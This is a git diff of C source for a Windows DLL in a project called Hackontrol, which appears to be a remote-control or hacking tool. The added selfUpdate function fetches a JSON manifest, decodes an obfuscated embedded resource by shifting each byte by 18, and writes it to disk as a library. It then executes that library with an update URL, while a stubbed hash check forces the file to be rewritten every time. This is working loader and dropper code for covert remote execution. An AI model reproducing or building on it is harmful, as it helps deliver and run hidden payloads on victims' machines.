@@ -1,20 +1,26 @@
 #include <libkhopancurl.h>
+#include <libhackontrol.h>
 #include <libhackontrolcurl.h>
 #include "execute.h"
 #include "resource.h"
 
-#define HACKONTROL_OVERRIDE
+//#define HACKONTROL_OVERRIDE
 
 #ifndef HACKONTROL_OVERRIDE
 #ifdef _DEBUG
 #define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
-#define HACKONTROL_NO_SELF_UPDATE
+//#define HACKONTROL_NO_SELF_UPDATE
 #define HACKONTROL_NO_DOWNLOAD_FILE
 #define HACKONTROL_NO_EXECUTE_FILE
 #endif
 #endif
 
-static HINSTANCE globalInstance;
+static HINSTANCE instance;
+
+BOOL WINAPI DllMain(HINSTANCE application, DWORD reason, LPVOID reserved) {
+	instance = application;
+	return TRUE;
+}
 
 static void parseArgument(const LPCSTR argument, const PDWORD processIdentifier, const PBOOL update) {
 	if(!argument || !strlen(argument)) {
@@ -43,6 +49,127 @@ static void parseArgument(const LPCSTR argument, const PDWORD processIdentifier,
 	LocalFree(arguments);
 }
 
+static BOOL selfUpdate(const cJSON* const root) {
+	if(!cJSON_IsObject(root)) {
+		return FALSE;
+	}
+
+	cJSON* self = cJSON_GetObjectItem(root, "self");
+
+	if(!self || !cJSON_IsObject(self)) {
+		return FALSE;
+	}
+
+	cJSON* urlField = cJSON_GetObjectItem(self, "url");
+
+	if(!urlField || !cJSON_IsString(urlField)) {
+		return FALSE;
+	}
+
+	char* url = cJSON_GetStringValue(urlField);
+
+	if(!url) {
+		return FALSE;
+	}
+
+	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();
+
+	if(!folderHackontrol) {
+		return FALSE;
+	}
+
+	if(!HackontrolCreateDirectory(folderHackontrol)) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
+
+	if(!fileLibdll32) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	BOOL result = HashFileCheck(self, fileLibdll32);
+	LocalFree(fileLibdll32);
+
+	if(result) {
+		LocalFree(folderHackontrol);
+		return TRUE;
+	}
+
+	HRSRC handle = FindResourceW(instance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+
+	if(!handle) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	DWORD size = SizeofResource(instance, handle);
+
+	if(!size) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	HGLOBAL resource = LoadResource(instance, handle);
+
+	if(!resource) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	PBYTE data = LockResource(resource);
+
+	if(!data) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	PBYTE buffer = LocalAlloc(LMEM_FIXED, size);
+
+	if(!buffer) {
+		LocalFree(folderHackontrol);
+		return FALSE;
+	}
+
+	for(DWORD i = 0; i < size; i++) {
+		buffer[i] = (data[i] - 18) % 0xFF;
+	}
+
+	LPWSTR fileLibupdate32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBUPDATE32, folderHackontrol);
+	LocalFree(folderHackontrol);
+
+	if(!fileLibupdate32) {
+		LocalFree(buffer);
+		return FALSE;
+	}
+
+	result = HackontrolWriteFile(fileLibupdate32, buffer, size);
+	LocalFree(buffer);
+
+	if(!result) {
+		LocalFree(fileLibupdate32);
+		return FALSE;
+	}
+
+	LPSTR argumentLibupdate32 = KHOPANFormatANSI("%lu %s", GetCurrentProcessId(), url);
+
+	if(!argumentLibupdate32) {
+		LocalFree(fileLibupdate32);
+		return FALSE;
+	}
+
+	KHOPANExecuteDynamicLibrary(fileLibupdate32, FUNCTION_LIBUPDATE32, argumentLibupdate32);
+	LocalFree(argumentLibupdate32);
+	LocalFree(fileLibupdate32);
+	return TRUE;
+}
+
+BOOL HashFileCheck(const cJSON* const root, const LPCWSTR file) {
+	return FALSE;
+}
+
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	DWORD processIdentifier = 0;
 	BOOL update = TRUE;
@@ -55,19 +182,20 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	}
 
 	cJSON* root = NULL;
+	HANDLE handle;
 #ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
-	HANDLE file = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	if(!file) {
+	if(!handle) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"CreateFileW");
 		goto cleanupGlobal;
 	}
 
 	LARGE_INTEGER integer;
 
-	if(!GetFileSizeEx(file, &integer)) {
+	if(!GetFileSizeEx(handle, &integer)) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"GetFileSizeEx");
-		CloseHandle(file);
+		CloseHandle(handle);
 		goto cleanupGlobal;
 	}
 
@@ -75,23 +203,23 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 
 	if(!buffer) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
-		CloseHandle(file);
+		CloseHandle(handle);
 		goto cleanupGlobal;
 	}
 
 	DWORD read;
 
-	if(!ReadFile(file, buffer, integer.LowPart, &read, NULL)) {
+	if(!ReadFile(handle, buffer, integer.LowPart, &read, NULL)) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"ReadFile");
 		LocalFree(buffer);
-		CloseHandle(file);
+		CloseHandle(handle);
 		goto cleanupGlobal;
 	}
 
 	buffer[integer.LowPart] = 0;
 	root = cJSON_Parse(buffer);
 	LocalFree(buffer);
-	CloseHandle(file);
+	CloseHandle(handle);
 #else
 	DATASTREAM stream = {0};
 	code = HackontrolDownload(URL_LATEST_FILE, &stream, TRUE, TRUE);
@@ -107,160 +235,33 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	}
 
 	root = cJSON_Parse(stream.data);
-	MessageBoxA(NULL, stream.data, "Text", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
 	KHOPANStreamFree(&stream);
 #endif
 	if(!root) {
 		MessageBoxW(NULL, L"Unable to parse JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
 		goto cleanupGlobal;
 	}
-
-	cJSON_Delete(root);
-	/*DataStream stream = {0};
-
-	if(!HackontrolForceDownload(&stream, URL_LATEST_FILE, TRUE)) {
-		KHWin32DialogErrorW(GetLastError(), L"HackontrolForceDownload");
-		goto globalCleanup;
-	}
-
-	KHDataStreamAdd(&stream, "", sizeof(CHAR));
-	cJSON* rootObject = cJSON_Parse(stream.data);
-	KHDataStreamFree(&stream);
-#endif
-	if(!rootObject) {
-		MessageBoxW(NULL, L"Error while parsing JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
-		goto globalCleanup;
-	}
 #ifndef HACKONTROL_NO_SELF_UPDATE
-	cJSON* selfObject = KHJSONGetObject(rootObject, "self", NULL);
-
-	if(!selfObject) {
-		goto exitUpdate;
+	if(selfUpdate(root)) {
+		goto deleteJson;
 	}
-
-	char* url = KHJSONGetString(selfObject, "url", NULL);
-
-	if(!url) {
-		goto exitUpdate;
-	}
-
-	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);
-
-	if(!pathFolderHackontrol) {
-		goto exitUpdate;
-	}
-
-	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
-
-	if(!pathFileLibdll32) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	BOOL result = CheckFileHash(selfObject, pathFileLibdll32);
-	LocalFree(pathFileLibdll32);
-
-	if(result) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
-
-	if(!resourceHandle) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);
-
-	if(!resourceSize) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);
-
-	if(!resource) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	BYTE* data = LockResource(resource);
-
-	if(!data) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	BYTE* resourceBuffer = LocalAlloc(LMEM_FIXED, resourceSize);
-
-	if(!resourceBuffer) {
-		LocalFree(pathFolderHackontrol);
-		goto exitUpdate;
-	}
-
-	for(DWORD i = 0; i < resourceSize; i++) {
-		resourceBuffer[i] = (data[i] - 18) % 0xFF;
-	}
-
-	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderHackontrol);
-	LocalFree(pathFolderHackontrol);
-
-	if(!pathFileLibupdate32) {
-		LocalFree(resourceBuffer);
-		goto exitUpdate;
-	}
-
-	DataStream resourceStream;
-	resourceStream.data = resourceBuffer;
-	resourceStream.size = resourceSize;
-	result = HackontrolWriteFile(pathFileLibupdate32, &resourceStream);
-	KHDataStreamFree(&resourceStream);
-
-	if(!result) {
-		LocalFree(pathFileLibupdate32);
-		goto exitUpdate;
-	}
-
-	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu %S", GetCurrentProcessId(), url);
-
-	if(!argumentFileLibupdate32) {
-		LocalFree(pathFileLibupdate32);
-		goto exitUpdate;
-	}
-
-	KHWin32StartDynamicLibraryW(pathFileLibupdate32, FUNCTION_LIBUPDATE32, argumentFileLibupdate32);
-	LocalFree(argumentFileLibupdate32);
-	LocalFree(pathFileLibupdate32);
-	goto deleteJson;
-exitUpdate:
 #endif
-	if(waitForProcess) {
-		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, waitingProcess);
-
-		if(process) {
-			WaitForSingleObject(process, INFINITE);
-			CloseHandle(process);
-		}
+	if(processIdentifier && (handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifier))) {
+		WaitForSingleObject(handle, INFINITE);
+		CloseHandle(handle);
 	}
-#ifndef HACKONTROL_NO_DOWNLOAD_FILE
+/*#ifndef HACKONTROL_NO_DOWNLOAD_FILE
 	if(!noUpdate) {
 		ProcessFilesArray(rootObject);
 	}
 #endif
 #ifndef HACKONTROL_NO_EXECUTE_FILE
 	ProcessEntrypointsArray(rootObject);
-#endif
+#endif*/
 #ifndef HACKONTROL_NO_SELF_UPDATE
 deleteJson:
 #endif
-	cJSON_Delete(rootObject);*/
+	cJSON_Delete(root);
 cleanupGlobal:
 	curl_global_cleanup();
-}
-
-BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
-	globalInstance = instance;
-	return TRUE;
 }
